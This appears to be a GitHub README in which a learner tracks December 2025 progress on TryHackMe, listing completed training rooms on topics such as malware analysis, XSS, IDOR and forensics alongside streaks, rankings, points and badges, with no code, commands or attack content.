                  <img width="800px" src="https://github.com/user-attachments/assets/553ba75d-5fa8-4bbd-b9f0-1196a2791601"><br><br>
                  <img width="800px" src="https://github.com/user-attachments/assets/a7359f80-1d61-4e6d-a453-307349ea7914"></p>

<h1 align="center">My TryHackMe Journey „Éª 2025, December</h1>

<div align="center"><h6>

| Date<br><br>   | Room <br><br> |Streak<br><br>   |Global<br>All Time|Brazil<br>All Time|Global<br>Monthly|Brazil<br>Monthly|Points<br><br>|Rooms<br>Completed|Badges<br><br>|
|:------:|:--------------------------------------|:--------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|
|23      |Easy üîó - Malware Analysis - Malhare.exe         |7 |      99·µó ∞  |     3 ≥·µà    |   17,332‚Åø·µà   |      191À¢·µó     |    134,968  |    1,044    |    84     |
|20      |Medium üîó - Containers - DoorDasher's Demise     |4 |     100·µó ∞  |     3 ≥·µà    |   18,059·µó ∞   |      206·µó ∞     |    134,864  |    1,043    |    84     |
|20      |Medium üîó - Forensics - Registry Furensics       |4 |     100·µó ∞  |     3 ≥·µà    |   20,497·µó ∞   |      239·µó ∞     |    134,832  |    1,042    |    84     |
|20      |Medium üîó - Web Attack Forensics - Drone Alone   |4 |     100·µó ∞  |     3 ≥·µà    |   21,935·µó ∞   |      243 ≥·µà     |    134,808  |    1,041    |    84     |
|20      |Easy üîó - XSS - Merry XSSMas                     |4 |     100·µó ∞  |     3 ≥·µà    |   23,069·µó ∞   |      256·µó ∞     |    134,792  |    1,040    |    84     |
|20      |Easy üîó -  Race Conditions - Toy to The World    |4 |     100·µó ∞  |     3 ≥·µà    |   24,717·µó ∞   |      275·µó ∞     |    134,768  |    1,039    |    84     |
|20      |Medium üîó -  SOC Alert Triaging - Tinsel Triage  |4 |     100·µó ∞  |     3 ≥·µà    |   25,202‚Åø·µà   |      286·µó ∞     |    134,752  |    1,038    |    84     |
|19      |Medium üîó -  ICS/Modbus - Claus for Concern      |3 |     101À¢·µó  |     3 ≥·µà    |   28,869·µó ∞   |      337·µó ∞     |    134,658  |    1,037    |    84     |
|19      |Easy üîó -  Passwords - A Cracking Christmas      |3 |     101À¢·µó  |     3 ≥·µà    |   29,583 ≥·µà   |      340·µó ∞     |    134,642  |    1,036    |    84     |
|18      |Easy üîó -  Prompt Injection - Sched-yule conflict|2 |     101À¢·µó  |     3 ≥·µà    |   30,518·µó ∞   |      353 ≥·µà     |    134,626  |    1,035    |    84     |
|18      |Medium üîó -  Obfuscation - The Egg Shell File    |2 |     101À¢·µó  |     3 ≥·µà    |   30,967·µó ∞   |      358·µó ∞     |    134,618  |    1,034    |    84     |
|17      |Medium üîó - CyberChef - Hoperation Save McSkidy  |1 |     101À¢·µó  |     3 ≥·µà    |   32,378·µó ∞   |      374·µó ∞     |    134,602  |    1,033    |    84     |
|7       |Medium üîó - Malware Analysis - Egg-xecutable     |2 |      95·µó ∞  |     3 ≥·µà    |   11,604·µó ∞   |      145·µó ∞     |    134,544  |    1,034    |    84     |
|7       |Easy üîó - Network Discovery - Scan-ta Clause     |2 |      95·µó ∞  |     3 ≥·µà    |   18,575·µó ∞   |      208·µó ∞     |    134,522  |    1,033    |    84     |
|7       |Easy üîó - React2Shell: CVE-2025-55182            |2 |      95·µó ∞  |     3 ≥·µà    |   28,593 ≥·µà   |      326·µó ∞     |    134,474  |    1,032    |    81     |
|6       |Medium üîó - IDOR - Santa¬¥s Little IDOR           |1 |      95·µó ∞  |     3 ≥·µà    |   27,309·µó ∞   |      328·µó ∞     |    134,450  |    1,031    |    81     |
|6       |Easy üîó - AI in Security - old sAInt nick        |1 |      95·µó ∞  |     3 ≥·µà    |   41,626·µó ∞   |      526·µó ∞     |    134,426  |    1,030    |    81     |
|6       |Medium üîó - Splunk Basics - Did you SIEM?        |1 |      95·µó ∞  |     3 ≥·µà    |   44,647·µó ∞   |      560·µó ∞     |    134,410  |    1,029    |    81     |
|6       |Easy üîó - Phishing - Merry Clickmas              |1 |      96·µó ∞  |     3 ≥·µà    |   55,824·µó ∞   |      674·µó ∞     |    134,370  |    1,028    |    81     |
|6       |Easy üîó - Linux CLI - Shells Bells               |1 |      97·µó ∞  |     3 ≥·µà    |   53,003 ≥·µà   |      712‚Åø·µà     |    134,354  |    1,027    |    81     |

</h6></div><br>

<p align="center">Global All Time:     99 ∞<br><img width="250px" src="https://github.com/user-attachments/assets/78a184d5-c8f1-4611-a3b1-2238a582ff12"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/216ad3e8-a1e1-4d25-b1cb-af8efcae49c7"><br><br>
                  Brazil All Time:      3 ≥·µà<br><img width="1200px" src="https://github.com/user-attachments/assets/3d42babf-e792-488e-936f-7edb36bca6c3"><br><br>
                  Global monthly:  17,332‚Åø·µà<br><img width="1200px" src="https://github.com/user-attachments/assets/1ec8a0a0-b763-4e73-a027-f9083cc17edf"><br><br>
                  Brazil monthly:     206·µó ∞<br><img width="1200px" src="https://github.com/user-attachments/assets/0103d1b7-af16-410a-8ff1-f3d482b3bde0"></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
